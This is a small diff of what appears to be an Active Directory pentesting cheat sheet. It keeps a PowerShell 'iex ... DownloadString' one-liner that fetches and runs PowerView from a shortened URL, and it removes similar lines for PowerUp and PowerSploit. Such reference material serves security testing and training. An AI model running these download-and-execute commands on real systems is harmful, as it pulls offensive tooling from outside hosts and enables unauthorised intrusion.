@@ -23,12 +23,6 @@ iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 # PowerView Module
 iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1pzQCnv'); . .\PowerView.ps1
-
-# PowerUp Module
-iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\PowerUp.ps1
-
-# PowerSploit Module
-iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1
 ```
 ## PRE-REQUISITE: AD Web Services on the DC
 
